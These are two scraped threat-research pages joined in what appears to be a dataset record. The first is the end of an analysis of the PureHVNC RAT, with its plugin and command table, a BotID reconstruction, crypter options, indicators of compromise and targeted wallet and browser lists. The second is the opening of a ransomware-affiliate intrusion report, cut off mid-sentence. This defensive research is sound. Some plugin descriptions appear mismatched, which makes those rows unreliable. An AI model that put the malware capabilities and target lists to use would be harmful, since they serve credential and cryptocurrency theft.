whether the infected machine has any devices recognized as cameras or imaging devices. This is determined by executing the WMI query, SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera') . Sandboxes and virtual machines often lack physical devices like webcams or imaging devices, and the absence of such devices can indicate a non-physical environment. The second collected data retrieves the tick count of the last input event (keyboard/mouse) and the last user activity on the machine. The third one is the executable name and path, that during this campaign the malware was installed in a fixed folder. This three information combined could be used by the attacker to determine whether the infected machine is a real user or not. Plugins & Commands PureHVNC stores plugins inside the registry key. The registry key uses the BotID, while the name and value are received by the C&C. The data of the plugin is compressed and reversed, and each time the plugin is loaded, it reverses the bytes and decompresses the buffer. The registry path is located at HKEY_CURRENT_USER\\Software\\{BOT_ID} and the Bot ID is generated with the following Python logic: # PureHVNC BotID generation logic import hashlib class PureBotID: def __init__(self, user_name: str, domain_name: str, processor_id: str, drive_sn: str, memory_sn: str): # Environment.UserName self.user_name = user_name # Environment.UserDomainName self.domain_name = domain_name # \"Win32_Processor\", \"ProcessorId\" self.processor_id = processor_id # \"Win32_DiskDrive\", \"SerialNumber\" self.drive_sn = drive_sn # \"Win32_PhysicalMemory\", \"SerialNumber\" self.memory_sn = memory_sn # generating Bot ID PureHVNC logic self.bot_id = self.generate_bot_id() def generate_bot_id(self) -> str: user_domain = f\"{self.user_name}[{self.domain_name}]\" if self.domain_name else self.user_name result = f\"{self.processor_id}{self.drive_sn}{self.memory_sn}{self.domain_name}{user_domain}\" return hashlib.md5(result.encode()).hexdigest().upper() Once the plugin is delivered to the infected victim, the threat actor can execute various commands. The majority of the commands have a one-on-one relation with the plugin, meaning that the plugin serves only one functionality, though some plugins serve multiple commands. Observed Plugins & supported Commands: ID Plugin Supported Commands Description 0 None None No operation. 1 RemoteHiddenVNC HvncRunpe Hidden Virtual Network Computing (HVNC) feature under a separate process. 2 RemoteHiddenVNCAudio EnableAudio HVNC with audio enabled. 3 RemoteAudio RemoteMic Captures live audio from the infected system\u2019s microphone. 4 TaskManager ProcessManager Displays, kills, restarts processes. 5 FileManager FileManager Displays, kills, and restarts processes. 6 Executing DownloadAndExecuteDisk DownloadAndExecuteMemory DownloadAndUpdate Executes computer-related commands such as Restarting, Shutting down PC and offers multiple Bot-C&C connection related features. 7 RemoteCamera RemoteWebcam Activates the victim\u2019s webcam and streams or captures images/video. 8 RemoteShell RemoteShell Remote Shell plugin and command. 9 RemoteDesktop RemoteDesktop Remote Desktop plugin and command. 11 PcOption DeletePlugins CloseConnection RestartConnection UninstallConnection ShutdownPC RestartPC BlockConnection Executes computer-related commands such as restarting, shutting down the PC and offers multiple Bot-C&C connection-related features. 12 Chat Chat Command allowing real-time text communication between the operator and the remote client. 13 Keylogger RemoteKeylogger Keylogging capabilities. 14 VisitWebsite VisitWebsite Visits specified website for a specified duration. 15 RevProxy RevProxyHttp RevProxySocks5 Reverse proxy supporting HTTP and SOCKS5. 16 TV TV Unknown, currently not used plugin-command. 17 ExecutePowershell DefednerExclusion PowershellOneLiner DeleteRestorePoints Executes PowerShell specified one-liner command. As well executes PowerShell to bypass Windows Defender. 18 RemoteHiddenVNC_Reflection RemoteHvncReflection Terminates Bot, with the option to delete. 19 TwitchBot TwitchBot Twitch Bot command is capable of sending a message to the Chat, following, unfollowing an account, clicking on ads. 20 YoutubeBot YoutubeBot YouTube Bot performs subscribe, unsubscribe to a specified account, send message, Like actions and click ads. 21 BotKiller BotKiller BotKillerWtihDelete Retrieves machine specs. 22 WindowNotify WindowNotify Alerts threat actor once a window caption matching specified keywords is opened. 23 RegistryManager RegistryManager Remote Registry editor, Delete, Create, Edit values and keys. 24 NetworkManager NetworkManager Allows threat actor to view active network connections, refresh connections list, kill specified connection, or terminate process with specific connection. 25 DDOS DdosManager Distributed Denial of Service (DDOS) against specified target. Three types of DDOS are supported: 1) HTTP Flood, 2) TCP Flood and 3) HTTP Bandwidth Exhaustion 26 PCSpecifications PCSpecifications Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in the exfiltration of huge files. 27 Coding ExecuteNETCode Executes .NET code specified by the threat actor. 28 InstalledApps InstalledApps Retrieves installed apps. 29 ActiveWindow ActiveWindows Able to control active windows on a remote machine. 30 HRDP HRDP Hidden Remote Desktop Protocol capabilities. 31 Clipper Clipper Monitors the system clipboard and replaces copied data with attacker-controlled content. More specifically detects Cryptocurrencies addresses and replaces them with wallets owned by the attacker. The malware supports Bitcoin (BTC), Litecoin (LTC), Ethereum (ETH), Ravencoin (RVN), Monero (XMR), Bitcoin Cash (BCH) 32 Torrent Torrent Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in exfiltration of huge files. 33 HostsEditor HostsEditor Allows an attacker to edit the remote machine\u2019s hosts file. The hosts file maps domain names to IP addresses, enabling an attacker to override DNS resolution or block/redirect traffic. 34 StartupManager StartupManager Collects all persistence entries that make programs run at boot. Then able to to remove them. PureCoder \u2013 Developer The Pure family of products includes multiple types of malware that are developed and sold by the same author, PureCoder . The list of products includes: PureCrypter , a Crypter for Native and .NET. PureRAT (PureHVNC RAT), a remote administration tool. PureLogs , a Stealer & Logger. PureMiner , a silent Crypto Miner. Blue Loader , an advanced Botnet. Other smaller malicious products. Figure 17 \u2014 Products advertisement. Multiple threat actors use those products for specific purposes. Often, PureCrypter is used as a crypter, obfuscating other Pure products, such as PureLogs or PureHVNC . The products are sold among the many PureCoder\u2019s Telegram channels. Figure 18 \u2014 PureCoder Telegram account. The developer and seller of the Pure malware family demonstrates the features and capabilities of each product, while the PureRAT administration-builder panel appears to support three main languages: English, Russian, and Chinese. Figure 19 \u2014 PureRAT Administration-Builder Panel. PureCoder \u2013 GitHub Account(s) During the previously mentioned campaign, with ID amazon3 , the malware communicated with its command and control server. The bot received three GitHub URLs and downloaded the corresponding files. Figure 20 \u2014 Contacted repository. The GitHub account owns a total of five repositories, which contain several executable and plugin files. Figure 21 \u2014 GitHub account. When examining the commits of the repository DFfe9ewf/test3 we discovered something that we did not expect. The commits and file uploads to the specific repository were made by \u201canother account\u201d, PureCoder . Mentioned commits: ================================================== [2024-10-31T02:01:36Z] Author: PureCoder tree 795fba180464a965f99fc2a50c5a3fad38a6939a author PureCoder < [email protected] > 1730340096 +0300 committer GitHub < [email protected] > 1730340096 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 ================================================== [2024-10-31T02:02:22Z] Author: PureCoder tree 8c302d85720b3fa2a8ecceffe1aa7cd23efbe9b5 parent 647343bed2af6e8c16f296d626d98cdfd0f84cf0 author PureCoder < [email protected] > 1730340142 +0300 committer GitHub < [email protected] > 1730340142 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9 ================================================== [2024-10-31T02:02:40Z] Author: PureCoder tree 4b0fa1d022d409825bb2a872e245ebc9b2bcaff2 parent f388ef87fcd48a2fe00fa449c1987115e5fe35c8 author PureCoder < [email protected] > 1730340160 +0300 committer GitHub < [email protected] > 1730340160 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 2e5050c50d3a8e9f376f0ae9394cf265ed3dcf06 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9 GitHub creates a noreply email shown in the commits with the ID and the Username of the account in the form [email protected] . The ID 87261126 actually, currently corresponds to DFfe9ewf which was renamed from PURE-CODER-1 . The commits have been made from the timezone UTC+0300 which corresponds to many countries, including Russia, among others. One of the three downloaded files was once again seen in another GitHub account, which possibly serves for development and testing purposes. Figure 22 \u2014 PureCoder Testing/Development account. The repository containing those files, DemoThing was created in March 2024, two more repositories with the description \u201cPR\u201d were created by this testing account during April 2025 and contain similar files. Figure 23 \u2014 PureCoder Testing/Development account repositories. Similar to the previous GitHub account, all commits are once again made in the timezone UTC+0300 and contain similar names and files hosted. This account was created testdemo345 was created before DFfe9ewf and appears to be serving for testing purposes during development phases. -------------------------------------------------- Repository Commits: Demothing ================================================== [2024-03-03T15:38:21Z] Author: testdemo345 tree 7f851ca85ec9136486692f283ff16c79a1a211ca author testdemo345 < [email protected] > 1709480301 +0300 committer GitHub < [email protected] > 1709480301 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 03d1d4a02fbd4c72b8ea9826a219a0511a62a974 * msedgedriver.exe - 44ceaa27e81a9a9f218fff2c720b72390ff1c6c3 -------------------------------------------------- Repository Commits: uhewrf90 ================================================== [2025-04-14T08:00:34Z] Author: testdemo345 tree 11e0357a36bd6e908cf9f6e7834cc201a70d692a author testdemo345 < [email protected] > 1744617634 +0300 committer GitHub < [email protected] > 1744617634 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 ================================================== [2025-04-14T08:00:53Z] Author: testdemo345 tree 4cf36f75defc34cbd1b50c23e932f8d9a87dca9b parent 98ac16ba3e512e495ebf8da7e1ea6bea904ea69b author testdemo345 < [email protected] > 1744617653 +0300 committer GitHub < [email protected] > 1744617653 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 ================================================== [2025-04-14T08:01:08Z] Author: testdemo345 tree 831bcb77a070b342115c68ced7cb22c0c778006f parent 564db1627658feb61fe87b07659d371c371a4a41 author testdemo345 < [email protected] > 1744617668 +0300 committer GitHub < [email protected] > 1744617668 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 -------------------------------------------------- Repository Commits: fdsgb890ugrds ================================================== [2025-04-14T08:04:51Z] Author: testdemo345 tree 85e444601df3b756209667504c39116a60e0e3d3 author testdemo345 < [email protected] > 1744617891 +0300 committer GitHub < [email protected] > 1744617891 +0300 Add files via upload * qbittorrent - 7075fb417919b4ae9335ee7abeb9553953c8aac8 Pure Builder & GitHub URLs At the beginning, we considered the contacted GitHub account ( DFfe9ewf / PURE-CODER-1 ) as part of the URL delivered by the threat actor, who can be simply a customer of Pure malware products. Though this hypothesis changed once we discovered a PureRAT Administration-Builder containing hardcoded the GitHub URLs supporting various functionalities of the malware itself. Figure 24 \u2014 PureRAT Administration-Builder Assembly. The GitHub URLs were hardcoded into the PureRAT administration-builder executable, meaning they were not delivered by the threat actor to the victims. Instead, they are part of the administration tool itself, developed by PureCoder . Figure 25 \u2014 Hardcoded GitHub URLs. These URLs and files appear to support the TwitchBot and YoutubeBot plugins. They are used for commands such as following or unfollowing accounts, liking videos, and clicking ads on specified videos on these platforms. While PureCoder currently uses GitHub and the above-mentioned accounts to host files that support various functionalities of PureRAT, Check Point Research expects these URLs to change more frequently, potentially using different GitHub accounts, alternative hosting platforms, or even being delivered directly as bytes to the bots by the administration tool. Pure Builder \u2013 PureCrypter Features While the tool we obtained appears to be PureRAT builder and administration software, some available features are related to the PureCrypter software solution sold and developed by PureCoder as well. The code specifies multiple enumerations (enum) related to PureCrypter. An enum is a list of named constants that represent specific values. PureCrypter enums: Enum Name Member Name Proto Value Display Name PureCrypterExtension exe 0 \u201c.exe\u201d PureCrypterExtension pif 1 \u201c.pif\u201d PureCrypterExtension com 2 \u201c.com\u201d PureCrypterExtension bat 3 \u201c.bat\u201d PureCrypterExtension cmd 4 \u201c.cmd\u201d PureCrypterExtension iso 5 \u201c.iso\u201d PureCrypterExtension img 6 \u201c.img\u201d PureCrypterExtension html 7 \u201c.html\u201d PureCrypterExtension setup 9 \u201c.setup\u201d PureCrypterExtension scr 10 \u201c.scr\u201d PureCrypterExtension vbs 11 \u201c.vbs\u201d PureCrypterFakeApp BitcoinTransactionAccelerator 0 \u201c[Fake] Bitcoin Transaction Accelerator\u201d PureCrypterFakeApp BitcoinMining 1 \u201c[Fake] Bitcoin CPU Mining\u201d PureCrypterFakeApp FakeRAT 2 \u201c[Fake] FakeRAT\u201d PureCrypterFakeMessageType Error 0 \u201cError\u201d PureCrypterFakeMessageType Information 1 \u201cInformation\u201d PureCrypterFolder AppData 0 \u201c%appdata%\u201d PureCrypterFolder Local 1 \u201c%localappdata%\u201d PureCrypterFolder Documents 2 \u201c%userprofile%\u201d PureCrypterFolder Temp 3 \u201c%temp%\u201d PureCrypterFramework Framework_45 0 \u201cv4.5\u201d PureCrypterFramework Framework_46 1 \u201cv4.6\u201d PureCrypterFramework Framework_48 2 \u201cv4.8\u201d PureCrypterInjection Reflection 0 \u201cReflection\u201d PureCrypterInjection RunPE 1 \u201cRunPE\u201d PureCrypterInjection Shellcode 2 \u201cShellcode\u201d PureCrypterStartup Registry 0 \u201cRegistry\u201d PureCrypterStartup StartupFolder 1 \u201cStartupFolder\u201d PureCrypterStartup TaskScheduler 2 \u201cTaskScheduler\u201d These enums give us some important information regarding the choices a threat actor can make during encrypting their malware using PureCrypter. For example, we can observe the installation options ( PureCrypterFolder ), the persistence mechanism ( PureCrypterStartup ) as well as the execution method ( PureCrypterInjection ). Conclusion The forensic investigation of the ClickFix campaign provides a comprehensive view of the Pure malware ecosystem and its operational mechanics. The eight-day intrusion highlighted the coordinated use of multiple tools, including Rust Loader , PureHVNC RAT , and the Sliver C2 framework , demonstrating the threat actor\u2019s sophistication. Check Point Research\u2019s in-depth analysis of PureHVNC RAT, including all its commands, plugins, and associated supporting files, sheds light on previously opaque aspects of this malware family. Significantly, the investigation linked several GitHub repositories directly to the developer, PureCoder , offering rare insights into their operational practices, including a UTC+0300 timezone and potential geographic locations. The discovery of the PureRAT builder and additional information on PureCrypter further illustrate the modular and evolving nature of this malware suite, emphasizing the ongoing threat posed by Pure malware to organizations globally. Overall, this research not only enhances understanding of the Pure malware family but also provides actionable intelligence that can assist cybersecurity professionals and law enforcement agencies in tracking and mitigating future campaigns conducted by both PureCoder and the cybercriminals leveraging their tools. Protections Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report. Indicators of Compromise Description Value JavaScript File 85513077AADBE50FE68055F0420DA2E6B97BD30D JavaScript C&Cs stathub[.]quest stategiq[.]quest mktblend[.]monster dsgnfwd[.]xyz dndhub[.]xyz First PureHVNC RAT E3A79CE291546191A5DDB039B2F9BF523BB9C4FB Inno Setup Second PureHVNC RAT D340B780194D44EE9B8D32F596B5A13723ABBE1D Rust Loader 99CBBE5F68D50B79AF8FB748F51794DE137F4FE4 PureHVNC 34EC79AB8A00DC6908874CDF7762756A2DCA4274 PureHVNC C&C 54.197.141[.]245 GitHub account hxxps://github[.]com/DFfe9ewf GitHub \u2013 chromedriver.exe 2E5050C50D3A8E9F376F0AE9394CF265ED3DCF06 GitHub \u2013 msedgedriver.exe 7B133998E526B3BEE151329171C82CA1837C86F9 GitHub \u2013 WebDriver.dll 39D3B6BEE5450D82D096AD7BDF4244FCB7B1EB81 PureRAT Builder 17E14B3CCF309FD9B5F7A5068A5CEDDD15FDEA0F Appendix Applications & Extensions Targeted Chromium extensions: ibnejdfjmmkpcnlpebklmnkoeoihofec - TronLink nkbihfbeogaeaoehlefnkodbefgpgknn - MetaMask fhbohimaelbohpjbbldcngcnapndodjp - Binance Chain Wallet ffnbelfdoeiohenkjibnmadjiehjhajb - Yoroi cjelfplplebdjjenllpjcblmjkfcffne - Jaxx Liberty fihkakfobkmkjojpchpfgcmhfjnmnfpi - BitApp Wallet kncchdigobghenbbaddojjnnaogfppfj - iWallet aiifbnbfobpmeekipheeijimdpnlpgpp - Terra Station ijmpgkjfkbfhoebgogflfebnmejmfbml - BitClip blnieiiffboillknjnepogjhkgnoapac - EQUAL Wallet amkmjjmmflddogmhpjloimipbofnfjih - Wombat jbdaocneiiinmjbjlgalhcelgbejmnid - Nifty Wallet afbcbjpbpfadlkmhmclhkeeodmamcflc - Math Wallet hpglfhgfnhbgpjdenjgmdgoeiappafln - Guarda aeachknmefphepccionboohckonoeemg - Coin98 Wallet imloifkgjagghnncjkhggdhalmcnfklk - Trezor Password Manager oeljdldpnmdbchonielidgobddffflal - EOS Authenticator gaedmjdfmmahhbjefcbgaolhhanlaolb - Authy ilgcnhelpchnceeipipijaljkblbcobl - GAuth Authenticator bhghoamapcdpbohphigoooaddinpkbai - Authenticator mnfifefkajgofkcjkemidiaecocnkjeh - TezBox dkdedlpgdmmkkfjabffeganieamfklkm - Cyano Wallet aholpfdialjgjfhomihkjbmgjidlcdno - Exodus Web3 jiidiaalihmmhddjgbnbgdfflelocpak - BitKeep hnfanknocfeofbddgcijnmhnfnkdnaad - Coinbase Wallet egjidjbpglichdcondbcbdnbeeppgdph - Trust Wallet hmeobnfnfcmdkdcmlblgagmfpfboieaf - XDEFI Wallet bfnaelmomeimhlpmgjnjophhpkkoljpa - Phantom fcckkdbjnoikooededlapcalpionmalo - MOBOX WALLET bocpokimicclpaiekenaeelehdjllofo - XDCPay flpiciilemghbmfalicajoolhkkenfel - ICONex hfljlochmlccoobkbcgpmkpjagogcgpk - Solana Wallet cmndjbecilbocjfkibfbifhngkdmjgog - Swash cjmkndjhnagcfbpiemnkdpomccnjblmj - Finnie dmkamcknogkgcdfhhbddcghachkejeap - Keplr kpfopkelmapcoipemfendmdcghnegimn - Liquality Wallet hgmoaheomcjnaheggkfafnjilfcefbmo - Rabet fnjhmkhhmkbjkkabndcnnogagogbneec - Ronin Wallet klnaejjgbibmhlephnhpmaofohgkpgkd - ZilPay ejbalbakoplchlghecdalmeeeajnimhm - MetaMask ghocjofkdpicneaokfekohclmkfmepbp - Exodus Web3 heaomjafhiehddpnmncmhhpjaloainkn - Trust Wallet hkkpjehhcnhgefhbdcgfkeegglpjchdc - Braavos Smart Wallet akoiaibnepcedcplijmiamnaigbepmcb - Yoroi djclckkglechooblngghdinmeemkbgci - MetaMask acdamagkdfmpkclpoglgnbddngblgibo - Guarda Wallet okejhknhopdbemmfefjglkdfdhpfmflg - BitKeep mijjdbgpgbflkaooedaemnlciddmamai - Waves Keeper Targeted Applications: Chromium - Chromium\\\\User Data\\\\ Chrome - Google\\\\Chrome\\\\User Data\\\\ Chrome - Google(x86)\\\\Chrome\\\\User Data\\\\ Brave - BraveSoftware\\\\Brave-Browser\\\\User Data\\\\ Edge - Microsoft\\\\Edge\\\\User Data\\\\ QQBrowser - Tencent\\\\QQBrowser\\\\User Data\\\\ ChromePlus - MapleStudio\\\\ChromePlus\\\\User Data\\\\ Iridium - Iridium\\\\User Data\\\\ 7Star - 7Star\\\\7Star\\\\User Data\\\\ CentBrowser - CentBrowser\\\\User Data\\\\ Chedot - Chedot\\\\User Data\\\\ Vivaldi - Vivaldi\\\\User Data\\\\ Kometa - Kometa\\\\User Data\\\\ Elements - Elements Browser\\\\User Data\\\\ Epic Privacy - Epic Privacy Browser\\\\User Data\\\\ Uran - uCozMedia\\\\Uran\\\\User Data\\\\ Sleipnir5 - Fenrir Inc\\\\Sleipnir5\\\\setting\\\\modules\\\\ChromiumViewer\\\\ Citrio - CatalinaGroup\\\\Citrio\\\\User Data\\\\ Coowon - Coowon\\\\Coowon\\\\User Data\\\\ liebao - liebao\\\\User Data\\\\ QIP Surf - QIP Surf\\\\User Data\\\\ Orbitum - Orbitum\\\\User Data\\\\ Dragon - Comodo\\\\Dragon\\\\User Data\\\\ Amigo - Amigo\\\\User\\\\User Data\\\\ Torch - Torch\\\\User Data\\\\ Comodo - Comodo\\\\User Data\\\\ 360Browser - 360Browser\\\\Browser\\\\User Data\\\\ Maxthon3 - Maxthon3\\\\User Data\\\\ K-Melon - K-Melon\\\\User Data\\\\ Sputnik - Sputnik\\\\Sputnik\\\\User Data\\\\ Nichrome - Nichrome\\\\User Data\\\\ CocCoc - CocCoc\\\\Browser\\\\User Data\\\\ Uran - Uran\\\\User Data\\\\ Chromodo - Chromodo\\\\User Data\\\\ Atom - Mail.Ru\\\\Atom\\\\User Data\\\\ Atomic Wallet Bitcoin-Qt Dash-Qt Electrum Ethereum Exodus Jaxx Litecoin-Qt Zcash Foxmail Telegram Ledger Live GO UP BACK TO ALL POSTS POPULAR POSTS Artificial Intelligence ChatGPT Check Point Research Publications OPWNAI : Cybercriminals Starting to Use ChatGPT Check Point Research Publications Threat Research Hacking Fortnite Accounts Artificial Intelligence ChatGPT Check Point Research Publications OpwnAI: AI That Can Save the Day or HACK it Away BLOGS AND PUBLICATIONS Check Point Research Publications Global Cyber Attack Reports Threat Research February 17, 2020 \u201cThe Turkish Rat\u201d Evolved Adwind in a Massive Ongoing Phishing Campaign Check Point Research Publications August 11, 2017 \u201cThe Next WannaCry\u201d Vulnerability is Here Check Point Research Publications January 11, 2018 \u2018RubyMiner\u2019 Cryptominer Affects 30% of WW Networks Publications Global cyber attack reports Research publications IPS advisories Check point blog Demos Tools Sandblast file analysis ThreatCloud Threat Intelligence Zero day protection Live threat map About Us Contact Us Let\u2019s get in touch Subscribe for cpr blogs, news and more Subscribe Now \u00a9 1994-2025 Check Point Software Technologies LTD. All rights reserved. Property of CheckPoint.com Privacy Policy SUBSCRIBE TO CYBER INTELLIGENCE REPORTS First Name Last Name Country \u2014Please choose an option\u2014 China India United States Indonesia Brazil Pakistan Nigeria Bangladesh Russia Japan Mexico Philippines Vietnam Ethiopia Egypt Germany Iran Turkey Democratic Republic of the Congo Thailand France United Kingdom Italy Burma South Africa South Korea Colombia Spain Ukraine Tanzania Kenya Argentina Algeria Poland Sudan Uganda Canada Iraq Morocco Peru Uzbekistan Saudi Arabia Malaysia Venezuela Nepal Afghanistan Yemen North Korea Ghana Mozambique Taiwan Australia Ivory Coast Syria Madagascar Angola Cameroon Sri Lanka Romania Burkina Faso Niger Kazakhstan Netherlands Chile Malawi Ecuador Guatemala Mali Cambodia Senegal Zambia Zimbabwe Chad South Sudan Belgium Cuba Tunisia Guinea Greece Portugal Rwanda Czech Republic Somalia Haiti Benin Burundi Bolivia Hungary Sweden Belarus Dominican Republic Azerbaijan Honduras Austria United Arab Emirates Israel Switzerland Tajikistan Bulgaria Hong Kong (China) Serbia Papua New Guinea Paraguay Laos Jordan El Salvador Eritrea Libya Togo Sierra Leone Nicaragua Kyrgyzstan Denmark Finland Slovakia Singapore Turkmenistan Norway Lebanon Costa Rica Central African Republic Ireland Georgia New Zealand Republic of the Congo Palestine Liberia Croatia Oman Bosnia and Herzegovina Puerto Rico Kuwait Moldov Mauritania Panama Uruguay Armenia Lithuania Albania Mongolia Jamaica Namibia Lesotho Qatar Macedonia Slovenia Botswana Latvia Gambia Kosovo Guinea-Bissau Gabon Equatorial Guinea Trinidad and Tobago Estonia Mauritius Swaziland Bahrain Timor-Leste Djibouti Cyprus Fiji Reunion (France) Guyana Comoros Bhutan Montenegro Macau (China) Solomon Islands Western Sahara Luxembourg Suriname Cape Verde Malta Guadeloupe (France) Martinique (France) Brunei Bahamas Iceland Maldives Belize Barbados French Polynesia (France) Vanuatu New Caledonia (France) French Guiana (France) Mayotte (France) Samoa Sao Tom and Principe Saint Lucia Guam (USA) Curacao (Netherlands) Saint Vincent and the Grenadines Kiribati United States Virgin Islands (USA) Grenada Tonga Aruba (Netherlands) Federated States of Micronesia Jersey (UK) Seychelles Antigua and Barbuda Isle of Man (UK) Andorra Dominica Bermuda (UK) Guernsey (UK) Greenland (Denmark) Marshall Islands American Samoa (USA) Cayman Islands (UK) Saint Kitts and Nevis Northern Mariana Islands (USA) Faroe Islands (Denmark) Sint Maarten (Netherlands) Saint Martin (France) Liechtenstein Monaco San Marino Turks and Caicos Islands (UK) Gibraltar (UK) British Virgin Islands (UK) Aland Islands (Finland) Caribbean Netherlands (Netherlands) Palau Cook Islands (NZ) Anguilla (UK) Wallis and Futuna (France) Tuvalu Nauru Saint Barthelemy (France) Saint Pierre and Miquelon (France) Montserrat (UK) Saint Helena, Ascension and Tristan da Cunha (UK) Svalbard and Jan Mayen (Norway) Falkland Islands (UK) Norfolk Island (Australia) Christmas Island (Australia) Niue (NZ) Tokelau (NZ) Vatican City Cocos (Keeling) Islands (Australia) Pitcairn Islands (UK) Email We value your privacy! BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies. ACCEPT REJECT",
    "expected_count": 5
  },
  {
    "url": "https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/",
    "title": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report",
    "content": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts dragonforce play ransomhub sectoprat Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs September 8, 2025 Key Takeaways The intrusion began when a user downloaded and executed a malicious file impersonating DeskSoft\u2019s EarthTime application but instead dropped SectopRAT malware. The threat actor deployed multiple malware families, including SystemBC for proxy tunneling, and later Betruger backdoor for additional capabilities. They leveraged various tools such as AdFind, SharpHound, SoftPerfect NetScan, and GT_NET.exe (Grixba) to map out the environment and perform reconnaissance activities. Lateral movement was primarily accomplished through RDP connections, with additional use of Impacket\u2019s wmiexec. The threat actor moved across multiple systems, including domain controllers, backup servers, and file servers, while maintaining persistence through local account creation and startup folder shortcuts. Data collection and exfiltration were performed using WinRAR to compress targeted file shares containing sensitive business documents, which were then transferred via WinSCP to an FTP server hosted by a cloud provider in clear text. The discovery of Grixba (a reconnaissance tool linked to Play ransomware), a previous NetScan output containing data from a company reportedly compromised by DragonForce ransomware, and the use of the Betruger backdoor suggest that the likely objective of this intrusion was ransomware deployment. Based on these findings, the threat actor behind this intrusion was most likely an affiliate operating across multiple ransomware groups. This case was originally published as a Threat Brief to customers in March of 2025. Interested in pricing or have questions about our services? Contact us The DFIR Report Services Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary The intrusion began in September 2024 with a download of a malicious file mimicking the EarthTime application by DeskSoft. Upon execution, SectopRAT was deployed which opened a connection to its command and control (C2) infrastructure. The threat actor established persistence by relocating the malicious file and placing a shortcut in the Startup folder, configured to trigger on user logon. They further elevated access by creating a new local account and assigning it local administrative privileges. Soon after establishing the initial access, the malware deployed SystemBC. They then accessed the beachhead host via RDP using the newly created local account and executed discovery commands. At this stage, the threat actor completed a DCSync attack against a domain controller. They then followed up by connecting to the domain controller over RDP with the built-in Administrator account and used PsExec to execute SystemBC with SYSTEM privileges on the host. Using their existing proxy tunnel, the threat actor once again used RDP to connect to hosts in the environment. While on the domain controller, we observed the threat actor using Windows utilities, such as ipconfig and nltest, to perform an enumeration. Over the next few hours, the threat actor connected to several servers using RDP and deployed SystemBC across the environment. On a backup server, they executed a PowerShell script designed to retrieve Veeam credentials. On the second day, the threat actor used RDP to move laterally to the file server where they dropped a WinRAR executable and archived specific file shares. They transferred the resulting archives to a U.S. based cloud host over unencrypted FTP using WinSCP. This enabled the retrieval of credentials, among other details, during traffic analysis. The threat actor also resumed discovery activity with the use of Grixba, a tool associated with Play Ransomware that uses WMI and WinRM to discover users and systems across the network, which was executed from both the domain controller and a backup server. They carried out further discovery activity with the use of AdFind for AD queries, PowerShell Cmdlets to collect host data, SharpHound for directory mapping, and SoftPerfect NetScan to scan remote hosts. On the sixth day of the intrusion, SectopRAT spawned a new payload on the beachhead host. The new payload executed was Betruger, a multi-function backdoor. The threat actor also used wmiexec to enumerate remote hosts through various reconnaissance commands executed on the domain controller. Throughout the intrusion, the threat actor used multiple defense evasion techniques, including process injection, timestomping, disabling Microsoft Defender\u2019s protections, and deploying binaries with spoofed metadata to disguise themselves as legitimate cybersecurity tools such as SentinelOne and Avast Antivirus. While no final actions were observed during this intrusion before the threat actor was evicted, the evidence shows links to three different ransomware operations. The Grixba tooling has been associated with the Play ransomware group. Similarly the Betruger backdoor has been linked to Ransomhub affiliated threat actors. And finally with opsec failures, the threat actor dropped the results of prior netscan discovery that appeared to contain data from a company that had been posted to the DragonForce Ransomware leak site prior in 2024. With each of these indicators we assess this threat actor was active as an affiliate for multiple ransomware groups. Analysts Analysis and reporting completed by r3nzsec , EncapsulateJ , rkonicekr , and Adam Rowe . Initial Access The intrusion began when a user downloaded and executed an executable impersonating 